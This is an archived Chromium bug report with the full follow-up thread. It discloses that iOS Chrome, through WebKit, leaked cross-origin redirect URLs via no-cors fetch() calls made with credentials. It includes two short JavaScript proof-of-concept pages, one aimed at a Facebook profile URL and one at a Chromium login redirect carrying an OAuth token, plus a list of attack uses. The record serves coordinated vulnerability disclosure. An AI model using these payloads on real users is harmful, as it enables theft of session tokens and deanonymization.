# Cross-Origin URL steal using Fetch and no-cors requests on iOS Chrome.

| Field | Value |
|-------|-------|
| **Issue ID** | [40093749](https://issues.chromium.org/issues/40093749) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Mobile>iOSWeb>Security |
| **Platforms** | iOS |
| **Reporter** | pr...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2019-01-14 |
| **Bounty** | $2,000.00 |

## Description

Steps to reproduce the problem:
There is Cross-Origin URL information steal issue on iOS Chrome.

First, this is the spec of JavaScript Fetch API: https://fetch.spec.whatwg.org/

Normally, attacker shouldn't be able to gain the Cross-Origin data. However, if you can make "no-cors" requests using API, the checks when you fetch() something don't happen.

About Fetch API: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch

This bug allows attacker to steal Cross-Origin URLs that might include personal information.

e.g. username.

Following POC steals the Cross-Origin URL, https://www.facebook.com as an example target. Please log in to your test purpose facebook account and open the POC url I provided below to reproduce this issue.

POC:

<h3 id="Facebook">Loading Facebook URL...</h3>
<h3 id="error"></h3>
<p>
<script>
function update(url, id)
{
    fetch(url, {
            mode: "no-cors",
            credentials: "include",
         }).then(function(response) {
                console.log(response);
                if (!response.url) {
                    document.getElementById("error").innerHTML = "no leak";
                    document.getElementById(id).innerHTML = "";
                }
                else
                {
                    document.getElementById(id).innerHTML = id + ": " + response.url;
                }
            }).catch(function(error) {
                console.log("Failed with: ", error);
    });
}
window.onload = function() {
    update("https://facebook.com/me", "Facebook");
}
</script></p>

Test live on: https://pwning.click/safarifetch.php

What is the expected behavior?
no leak

What went wrong?
Fetch API with no-cors requests reveals Cross-Origin URL.

Did this work before? N/A 

Chrome version: 71.0.3578.98  Channel: stable
OS Version: 12.1.2
Flash Version:

## Timeline

### rs...@chromium.org (2019-01-14)

Does Safari on iOS also have this problem?

[Monorail components: Blink>Network>FetchAPI Blink>SecurityFeature>CORS]

### pr...@gmail.com (2019-01-14)

Yes. I also reported here to see if this issue could be prevented before Apple fixes the problem.

### eu...@chromium.org (2019-01-14)

Ali, would you mind trying to fix the bug in WebKit? I will take a look if we can workaround the bug in Chrome. 

[Monorail components: -Blink>Network>FetchAPI -Blink>SecurityFeature>CORS Mobile>iOSWeb>Security]

### jd...@chromium.org (2019-01-15)

I'm assigning this to Eugene to get it out of triage, but if neither of you can take it, feel free to set ExternalDependency.

### aj...@chromium.org (2019-01-17)

Filed https://bugs.webkit.org/show_bug.cgi?id=193553 and posted a patch for review there.

### aj...@chromium.org (2019-01-18)

The WebKit patch has now landed.

### eu...@chromium.org (2019-01-18)

Workaround in Chrome is not possible because WKNavigationDelegate is not even notified about fetching https://facebook.com/me URL.

### dd...@apple.com (2019-01-18)

I'll make sure this fix gets into a sooner software update rather than the next major release.


### eu...@chromium.org (2019-01-26)

[Empty comment from Monorail migration]

### eu...@chromium.org (2019-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### pr...@gmail.com (2021-06-01)

Hi, what is the reward for this bug? we are able to leak oauth token via this bug e.g. https://bugs.chromium.org/p/chromium/issues/entryafterlogin link on update will redirect to token param and leak the token. Impact of this bug are following, well described in this post: https://blog.lbherrera.me/posts/appcache-forgotten-tales/

1. Redirects to URLs that contain a session token in the query string.
2. Redirects to URLs that contain a CSRF token in the query string.
3. Redirects to sensitive information (private documents, photos, etc).
4. Redirects to the user’s profile (for deanonymization).

PoC:

<h3 id="token">Loading your https://bugs.chromium.org google account token...</h3>
<h3 id="error"></h3>
<p>
<script>
function update(url, id)
{
    fetch(url, {
            mode: "no-cors",
            credentials: "include",
         }).then(function(response) {
                console.log(response);
                if (!response.url) {
                    document.getElementById("error").innerHTML = "no leak";
                    document.getElementById(id).innerHTML = "";
                }
                else
                {
                    document.getElementById(id).innerHTML = id + ": " + response.url;
                }
            }).catch(function(error) {
                console.log("Failed with: ", error);
    });
}
window.onload = function() {
    update("https://bugs.chromium.org/p/chromium/issues/entryafterlogin", "Token");
}
</script></p>

could you kindly review this bug for a reward and modify severity to at least Medium? thanks.


### aj...@chromium.org (2021-06-02)

Sorry for the delay in marking this fixed (which triggers the reward review process).

Marking as fixed now.

### [Deleted User] (2021-06-02)

[Empty comment from Monorail migration]

### pr...@gmail.com (2021-06-13)

Hi, thanks for marking as fixed but I'm afraid the reward review process is not triggered.

### aj...@chromium.org (2021-06-14)

+adetaylor who'd know more about the process

### rs...@chromium.org (2021-06-14)

+amyressler because Ade is out

### am...@chromium.org (2021-06-14)

Thanks for tagging me, Robert. :) 
The reward process is triggered by the label == reward-topanel, which is listed in the labels pane on the left. So it's indeed on track to be considered for a VRP reward. Thanks!

### pr...@gmail.com (2021-06-14)

I see, thanks for letting me know! please let me know on reconsidering severity from Low to Medium reflecting the fact on https://crbug.com/chromium/921607#c14 too. Thanks!

### pr...@gmail.com (2021-06-18)

Ping!

### am...@chromium.org (2021-06-18)

Pong! This will be considered for a reward for VRP reward at a future panel discussion. There are a number of bugs to discuss at each session, so we just haven't gotten to this one just yet. 

### pr...@gmail.com (2021-06-18)

Thanks, https://crbug.com/chromium/921607#c14 to be considered for security severity Low -> Medium too.

### pr...@gmail.com (2021-06-19)

why no reply on severity change request though? this bug clearly allow attackers to steal Cross-Origin URLs including OAuth tokens which deserves *at least* Medium Severity. Cheers.

### am...@chromium.org (2021-06-21)

There isn't sufficient reason to adjust the severity on this issue in our queue, especially given this is an external dependency issue in WebKit. Severity affects our internal processes and prioritization; it does not affect the reward decisions. Thank you. 

### am...@google.com (2021-06-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-06-23)

Congratulations, the VRP Panel has decided to award you $2,000 for this report. Nice work!  

### am...@google.com (2021-06-30)

[Empty comment from Monorail migration]

### pr...@gmail.com (2021-07-04)

Thanks for the reward. May I ask the reward panel to reconsider on the amount? this bug allows oauth token stealing from determined attackers for widespread attacks and further (mass users impersonation) which is clearly more severe than Monorail under Google's VRP CSRF user impersonation case which is being awarded up to $5000 - and there is also an example of bug report with "identical" impact which has been rewarded $5000 (even the bug and PoC is pretty similar, my report was years before however): https://bugs.chromium.org/p/chromium/issues/detail?id=1039869, https://bugs.chromium.org/p/chromium/issues/detail?id=1152226. The other note is that I've got rewarded with some multiple $5k ($5k x 3: MSRC Case 47204, 54418 and 56628) for similar bugs with identical impact: "Stealing Cross-Origin URL on Legacy Microsoft Edge" from Microsoft MSRC and their bounty program has same reward range for information disclosure bugs which is up to 5k just like Google VRP. Thanks again!

### [Deleted User] (2021-09-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2021-09-08)

This issue was migrated from crbug.com/chromium/921607?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-19)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093749)*
